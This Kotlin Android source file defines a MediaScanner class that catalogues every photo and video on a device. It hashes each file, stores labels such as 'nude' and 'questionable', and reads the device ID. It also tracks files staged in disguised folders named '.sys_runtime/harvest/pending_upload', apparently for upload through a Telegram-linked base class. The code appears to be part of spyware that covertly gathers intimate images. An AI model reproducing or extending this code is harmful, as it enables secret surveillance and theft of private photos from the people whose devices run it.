package com.example.app

import android.content.ContentValues
import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import java.io.File
import java.security.MessageDigest

// ✅ استخدام data class بدلاً من Pair لحل مشكلة Type mismatch نهائياً
data class CategoryResult(val category: String, val prob: Float)

class MediaScanner(
    context: Context,
    scanner: Any? = null,
    telegram: Any? = null
) : GalleryBrowser(context, scanner, telegram) {

    companion object {
        private const val TAG = "MediaScanner"
        private const val DATABASE_NAME = "media_categories.db"
        private const val DATABASE_VERSION = 1

        @JvmStatic
        fun create(
            context: Context,
            scanner: Any? = null,
            telegram: Any? = null
        ): MediaScanner {
            return MediaScanner(context, scanner, telegram)
        }
    }

    private val dbHelper: CategoryDatabaseHelper by lazy {
        CategoryDatabaseHelper(appContext ?: context)
    }

    private val mediaObserver = MediaStoreObserver(Handler(Looper.getMainLooper()))
    private var isObserving = false

    override fun getGalleryByCategory(category: String, limit: Int): List<Map<String, Any>> {
        Log.d(TAG, "getGalleryByCategory called with category=$category, limit=$limit")
        return when (category.lowercase()) {
            "pending" -> getPendingFiles(limit)
            "screenshot" -> getMediaFilesByFolder("Screenshots", limit)
            "download" -> getMediaFilesByFolder("Download", limit)
            "nude" -> getFilesByCategory("nude", limit)
            "questionable" -> getFilesByCategory("questionable", limit)
            else -> getAllMediaFiles(limit)
        }
    }

    private fun getPendingFiles(limit: Int): List<Map<String, Any>> {
        val ctx = appContext ?: return emptyList()
        val files = mutableListOf<Map<String, Any>>()
        val dirs = listOf(
            File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
            File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
        )
        dirs.forEach { dir ->
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { file ->
                    if (file.isFile && file.length() > 0) {
                        files.add(
                            mapOf(
                                "path" to file.absolutePath,
                                "name" to file.name,
                                "size" to file.length(),
                                "hash" to fileHash(file),
                                "timestamp" to (file.lastModified() / 1000),
                                "type" to getFileType(file)
                            )
                        )
                    }
                }
            }
        }
        files.sortByDescending { it["timestamp"] as? Long ?: 0L }
        return if (limit > 0) files.take(limit) else files
    }

    private fun getAllMediaFiles(limit: Int): List<Map<String, Any>> {
        val allFiles = mutableListOf<Map<String, Any>>()
        allFiles.addAll(queryMediaStore(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_MODIFIED,
                MediaStore.Images.Media.MIME_TYPE
            ),
            "image"
        ))
        allFiles.addAll(queryMediaStore(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DATE_MODIFIED,
                MediaStore.Video.Media.MIME_TYPE
            ),
            "video"
        ))
        allFiles.sortByDescending { it["timestamp"] as? Long ?: 0L }
        return if (limit > 0) allFiles.take(limit) else allFiles
    }

    private fun getMediaFilesByFolder(folderName: String, limit: Int): List<Map<String, Any>> {
        val allFiles = getAllMediaFiles(0)
        val filtered = allFiles.filter { file ->
            val path = file["path"] as? String ?: ""
            path.contains(folderName, ignoreCase = true)
        }
        return if (limit > 0) filtered.take(limit) else filtered
    }

    private fun getFilesByCategory(category: String, limit: Int): List<Map<String, Any>> {
        val allFiles = getAllMediaFiles(0)
        val categorizedHashes = getHashesByCategory(category)
        val filtered = allFiles.filter { file ->
            val hash = file["hash"] as? String ?: ""
            categorizedHashes.contains(hash)
        }
        return if (limit > 0) filtered.take(limit) else filtered
    }

    private fun queryMediaStore(
        uri: Uri,
        projection: Array<String>,
        defaultType: String
    ): List<Map<String, Any>> {
        val ctx = appContext ?: return emptyList()
        val results = mutableListOf<Map<String, Any>>()
        try {
            val cursor: Cursor? = ctx.contentResolver.query(
                uri,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
            )
            cursor?.use {
                val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val nameIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val sizeIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val dateIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)
                while (it.moveToNext()) {
                    val path = it.getString(dataIndex)
                    if (!path.isNullOrBlank()) {
                        val file = File(path)
                        if (file.exists() && file.isFile && file.length() > 0) {
                            results.add(
                                mapOf(
                                    "path" to path,
                                    "name" to it.getString(nameIndex) ?: file.name,
                                    "size" to it.getLong(sizeIndex),
                                    "hash" to fileHash(file),
                                    "timestamp" to it.getLong(dateIndex),
                                    "type" to defaultType
                                )
                            )
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "queryMediaStore error: ${e.message}", e)
        }
        return results
    }

    fun updateCategory(hash: String, category: String, prob: Float) {
        if (hash.isBlank()) return
        Log.d(TAG, "updateCategory: hash=$hash, category=$category, prob=$prob")
        try {
            val db = dbHelper.writableDatabase
            val values = ContentValues().apply {
                put("hash", hash)
                put("category", category)
                put("prob", prob)
                put("timestamp", System.currentTimeMillis() / 1000)
            }
            db.insertWithOnConflict("categories", null, values, SQLiteDatabase.CONFLICT_REPLACE)
            db.close()
        } catch (e: Exception) {
            Log.e(TAG, "updateCategory error: ${e.message}")
        }
    }

    /**
     * ✅ الحل النهائي والجذري:
     * استخدام CategoryResult بدلاً من Pair.
     * لا يوجد أي استخدام لـ Pair في هذه الدالة.
     */
    fun getCategory(hash: String): CategoryResult? {
        if (hash.isBlank()) return null
        var db: SQLiteDatabase? = null
        var cursor: Cursor? = null
        return try {
            db = dbHelper.readableDatabase
            cursor = db.query(
                "categories",
                arrayOf("category", "prob"),
                "hash = ?",
                arrayOf(hash),
                null,
                null,
                null
            )
            if (cursor != null && cursor.moveToFirst()) {
                val category = cursor.getString(0)
                val prob = cursor.getFloat(1)
                if (category != null && !cursor.isNull(1)) {
                    return CategoryResult(category, prob)
                }
            }
            null
        } catch (e: Exception) {
            Log.e(TAG, "getCategory error: ${e.message}")
            null
        } finally {
            try { cursor?.close() } catch (_: Exception) {}
            try { db?.close() } catch (_: Exception) {}
        }
    }

    private fun getHashesByCategory(category: String): Set<String> {
        val hashes = mutableSetOf<String>()
        var db: SQLiteDatabase? = null
        var cursor: Cursor? = null
        try {
            db = dbHelper.readableDatabase
            cursor = db.query(
                "categories",
                arrayOf("hash"),
                "category = ?",
                arrayOf(category),
                null,
                null,
                null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val hash = it.getString(0)
                    if (!hash.isNullOrBlank()) {
                        hashes.add(hash)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getHashesByCategory error: ${e.message}")
        } finally {
            try { cursor?.close() } catch (_: Exception) {}
            try { db?.close() } catch (_: Exception) {}
        }
        return hashes
    }

    override fun runScan(initial: Boolean) {
        Log.d(TAG, "runScan called with initial=$initial")
        if (initial) startObserving() else clearCache()
    }

    private fun startObserving() {
        if (isObserving) return
        val ctx = appContext ?: return
        try {
            ctx.contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                mediaObserver
            )
            ctx.contentResolver.registerContentObserver(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                true,
                mediaObserver
            )
            isObserving = true
            Log.d(TAG, "✅ MediaStore observer started")
        } catch (e: Exception) {
            Log.e(TAG, "startObserving error: ${e.message}")
        }
    }

    private fun stopObserving() {
        if (!isObserving) return
        val ctx = appContext ?: return
        try {
            ctx.contentResolver.unregisterContentObserver(mediaObserver)
            isObserving = false
            Log.d(TAG, "🛑 MediaStore observer stopped")
        } catch (e: Exception) {
            Log.e(TAG, "stopObserving error: ${e.message}")
        }
    }

    private fun clearCache() {
        try {
            val field = GalleryBrowser::class.java.getDeclaredField("cachedFiles")
            field.isAccessible = true
            field.set(this, null)
            val timestampField = GalleryBrowser::class.java.getDeclaredField("cacheTimestamp")
            timestampField.isAccessible = true
            timestampField.set(this, 0L)
            Log.d(TAG, "Cache cleared")
        } catch (e: Exception) {
            Log.w(TAG, "clearCache error: ${e.message}")
        }
    }

    override fun getDid(): String {
        val ctx = appContext ?: return "Unknown"
        return try {
            android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "Unknown"
        } catch (e: Exception) {
            Log.e(TAG, "getDid error: ${e.message}")
            "Unknown"
        }
    }

    override fun getPendingCount(): Int {
        val ctx = appContext ?: return 0
        var count = 0
        val dirs = listOf(
            File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
            File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
        )
        dirs.forEach { dir ->
            if (dir.exists() && dir.isDirectory) {
                count += dir.listFiles()?.filter { it.isFile }?.size ?: 0
            }
        }
        return count
    }

    fun deleteFileByHash(hash: String): Boolean {
        if (hash.isBlank()) return false
        val ctx = appContext ?: return false
        val dirs = listOf(
            File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
            File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
        )
        dirs.forEach { dir ->
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { file ->
                    if (file.isFile && fileHash(file) == hash) {
                        try {
                            val db = dbHelper.writableDatabase
                            db.delete("categories", "hash = ?", arrayOf(hash))
                            db.close()
                        } catch (e: Exception) {
                            Log.e(TAG, "deleteCategory error: ${e.message}")
                        }
                        return file.delete()
                    }
                }
            }
        }
        return false
    }

    fun close() {
        stopObserving()
        try {
            dbHelper.close()
        } catch (e: Exception) {
            Log.e(TAG, "close error: ${e.message}")
        }
        Log.d(TAG, "MediaScanner closed")
    }

    private fun fileHash(file: File): String {
        if (!file.exists() || !file.isFile) return ""
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            java.io.FileInputStream(file).use { fis ->
                val buffer = ByteArray(8192)
                var read: Int
                while (fis.read(buffer).also { read = it } != -1) {
                    md.update(buffer, 0, read)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "fileHash error: ${e.message}")
            ""
        }
    }

    private fun getFileType(file: File): String {
        val name = file.name.lowercase()
        return when {
            name.endsWith(".jpg") || name.endsWith(".jpeg") ||
            name.endsWith(".png") || name.endsWith(".webp") ||
            name.endsWith(".bmp") || name.endsWith(".gif") -> "image"
            name.endsWith(".mp4") || name.endsWith(".avi") ||
            name.endsWith(".mov") || name.endsWith(".mkv") ||
            name.endsWith(".3gp") || name.endsWith(".webm") -> "video"
            name.endsWith(".mp3") || name.endsWith(".wav") ||
            name.endsWith(".aac") || name.endsWith(".m4a") -> "audio"
            else -> "other"
        }
    }

    private inner class CategoryDatabaseHelper(context: Context) :
        SQLiteOpenHelper(context, DATABASE_NAME, null, DATABASE_VERSION) {
        override fun onCreate(db: SQLiteDatabase) {
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS categories (
                    hash TEXT PRIMARY KEY,
                    category TEXT NOT NULL,
                    prob REAL NOT NULL,
                    timestamp INTEGER NOT NULL
                )
            """.trimIndent())
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_category ON categories(category)")
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_timestamp ON categories(timestamp)")
            Log.d(TAG, "✅ Categories database created")
        }
        override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
            db.execSQL("DROP TABLE IF EXISTS categories")
            onCreate(db)
        }
    }

    private inner class MediaStoreObserver(handler: Handler) : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            Log.d(TAG, "MediaStore changed, clearing cache")
            clearCache()
        }
    }
}
